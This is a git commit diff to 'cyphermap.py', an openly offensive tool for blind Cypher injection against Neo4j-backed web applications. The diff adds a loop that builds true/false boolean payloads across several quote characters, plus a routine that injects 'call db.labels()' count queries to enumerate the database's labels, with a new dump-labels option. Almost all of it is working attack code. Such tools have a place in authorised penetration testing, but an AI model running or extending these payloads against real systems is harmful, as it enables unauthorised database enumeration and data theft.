295d2da58e28480754e92fdfdea3ec6f51049ce8
Michał Majchrowicz <sectroyer@gmail.com>
2023-04-27 15:58:20 +0200

    Implement get_number_of_labels.
    Signed-off-by: Michał Majchrowicz <sectroyer@gmail.com>

--- cyphermap.py
+++ cyphermap.py
@@ -8,10 +8,12 @@ import sys
 
 
 def perform_request(target_url, post_data=False, cookies_dict={}, connection_timeout=5):
+    #proxies={}
     proxies={'http':'http://localhost:8080'}
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'} # Please modify manually if you are sending JSON :)
     try:
         if post_data:
-            response = requests.post(target_url, data=post_data, cookies=cookies_dict, timeout=connection_timeout, proxies=proxies)
+            response = requests.post(target_url, data=post_data, cookies=cookies_dict, timeout=connection_timeout, proxies=proxies, headers=headers)
         else:
             response = requests.get(target_url, cookies=cookies_dict, timeout=connection_timeout,proxies=proxies)
 
@@ -39,29 +41,29 @@ def cypher_inject(target_url, payload, post_data=False, cookies_dict={}, connect
 def get_injection_type(target_url, blind_string, post_data, cookies_dict, connection_timeout):
     
     injection_character = "'" 
-    
-    # Generate random values for the payload
-    number1 = random.randint(0, 10000)
-    number2 = random.randint(0, 10000)
+    injection_characters=[" ", '"', "'"]
+   
+    for injection_character in injection_characters:
+        # Generate random values for the payload
+        number1 = random.randint(0, 10000)
+        number2 = random.randint(0, 10000)
 
-    # Prepare the payloads for the two requests
-    true_payload = injection_character + " and " + injection_character + str(number1) + injection_character + "=" + injection_character + str(number1)
-    false_payload = injection_character + " and " + injection_character + str(number1) + injection_character + "=" + injection_character + str(number2)
+        # Prepare the payloads for the two requests
+        true_payload = injection_character + " and " + injection_character + str(number1) + injection_character + "=" + injection_character + str(number1)
+        false_payload = injection_character + " and " + injection_character + str(number1) + injection_character + "=" + injection_character + str(number2)
 
-    true_result = cypher_inject(target_url, true_payload, post_data, cookies_dict, connection_timeout)
-    # Try to inject the payloads using single quotes in target_url and post_data
-    try:
-        true_result = cypher_inject(target_url, true_payload, post_data, cookies_dict, connection_timeout)
-        false_result = cypher_inject(target_url, false_payload, post_data, cookies_dict, connection_timeout)
-    except:
-        print("Unable to perform cypher injection")
-        return False
+        # Try to inject the payloads using single quotes in target_url and post_data
+        try:
+            true_result = cypher_inject(target_url, true_payload, post_data, cookies_dict, connection_timeout)
+            false_result = cypher_inject(target_url, false_payload, post_data, cookies_dict, connection_timeout)
+        except:
+            print("Unable to perform cypher injection!!!")
+            sys.exit(-1)
 
-    # Check if the blind string is present in the response to the first request but not in the response to the second request
-    if blind_string in true_payload and blind_string not in false_result:
-        return injection_character
-    else:
-        return False
+        # Check if the blind string is present in the response to the first request but not in the response to the second request
+        if blind_string in true_result and blind_string not in false_result:
+            return injection_character
+    return False
 
 def generate_cookies_dictionary(cookie_string):
     cookie_dict = {}
@@ -73,6 +75,15 @@ def generate_cookies_dictionary(cookie_string):
                 cookie_dict[name_value[0]] = name_value[1]
     return cookie_dict
 
+def get_number_of_labels(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
+    for number_of_labels in range(0,100,1): # Arbitarly set max number or labels to 100 :)
+        payload = injection_type + " and count {call db.labels() yield label return label} = " + str(number_of_labels)
+        payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+        injection_result=cypher_inject(target_url, payload, post_data, cookies_dict, connection_timeout)
+        if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
+            return number_of_labels
+    print("Unable to check number of labels!!!")
+    sys.exit(-1)
 
 print('\nCypher Mapping Tool by sectroyer v0.1\n')
 
@@ -83,6 +94,7 @@ try:
     parser.add_argument('-c', '--cookie', help='Request cookie', default={})
     parser.add_argument('-s', '--string', help='Blind string')
     parser.add_argument('-t', '--timeout', help='Connection timeout', default=5)
+    parser.add_argument('-L', '--labels', help='Dump labels', action='store_true')
     args = parser.parse_args()
 
     target_url = args.url
@@ -101,8 +113,17 @@ try:
         sys.exit(-1)
     
     injection_type=get_injection_type(target_url, blind_string, post_data, cookies_dict, connection_timeout)
-    print("Injection type: "+injection_type)
+    if injection_type:
+        print(f"Injection type: {injection_type}\n")
+    else:
+        print("Unable to find valid injection type...\n")
+        sys.exit(-1)
+    if args.labels:
+        print("Dumping labels....\n")
+        number_of_labels = get_number_of_labels(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
+        print(f"Number of labels found: {number_of_labels}\n")
 
+    print('')
 except SystemExit:
     print('')
     sys.exit()
